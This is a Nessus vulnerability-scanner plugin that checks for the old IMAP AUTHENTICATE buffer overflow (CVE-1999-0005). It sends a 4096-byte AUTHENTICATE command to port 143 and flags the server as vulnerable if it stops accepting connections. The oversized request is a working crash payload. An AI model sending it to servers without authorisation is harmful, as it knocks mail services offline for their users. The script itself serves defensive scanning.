#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10292);
 script_bugtraq_id(130);
 script_version ("$Revision: 1.19 $");
 script_cve_id("CVE-1999-0005");
 
 name["english"] = "imap authenticate buffer overflow";
 script_name(english:name["english"]);

 desc["english"] = "
Synopsis :

It is possible to execute code on the remote IMAP server.

Description :

It was possible to crash the remote IMAP server by sending
a too long AUTHENTICATE command.
An attacker may be able to exploit this vulnerability to 
execute code on the remote host.

Solution :

Contact your IMAP server vendor.

Risk factor :

Critical / CVSS Base Score : 10 
(AV:R/AC:L/Au:NR/C:C/A:C/I:C/B:N)";
 
 script_description(english:desc["english"]);
		    
 
 summary["english"] = "checks for imap authenticate buffer overflow"; 
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);

 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison");
 
 family["english"] = "Gain root remotely";
 
 script_family(english:family["english"]);
	       
 script_dependencie("find_service.nes", "imap_overflow.nasl");
 script_exclude_keys("imap/false_imap");
 script_require_ports("Services/imap", 143);
 exit(0);
}

#
# The script code starts here
#


port = get_kb_item("Services/imap");
if(!port)port = 143;

if(get_port_state(port))
{
 data = string("* AUTHENTICATE {4096}\r\n", crap(4096), "\r\n");
 soc = open_sock_tcp(port);
 if(soc > 0)
 {
  buf = recv_line(socket:soc, length:1024);
  if (!strlen(buf))
    exit(0);

  send(socket:soc, data:data);
  buf = recv_line(socket:soc, length:1024);
  close (soc);

  soc = open_sock_tcp (port);
  if (!soc)
  {
   security_hole(port);
   set_kb_item(name:"imap/overflow", value:TRUE);
  }
 }
}
